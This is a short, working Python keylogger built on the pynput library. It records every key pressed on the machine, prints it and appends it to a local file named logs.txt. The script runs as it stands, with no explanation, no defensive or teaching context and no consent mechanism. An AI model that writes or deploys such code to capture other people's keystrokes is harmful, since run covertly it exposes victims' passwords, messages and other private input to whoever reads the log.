# pip install pynput
from pynput.keyboard import Key, Listener


def WhenPressKey(key):
    fp = open("logs.txt", "a")
    print(key)
    fp.write(str(key) + "\n")
    fp.close()


with Listener(on_press=WhenPressKey) as listener:
    listener.join()
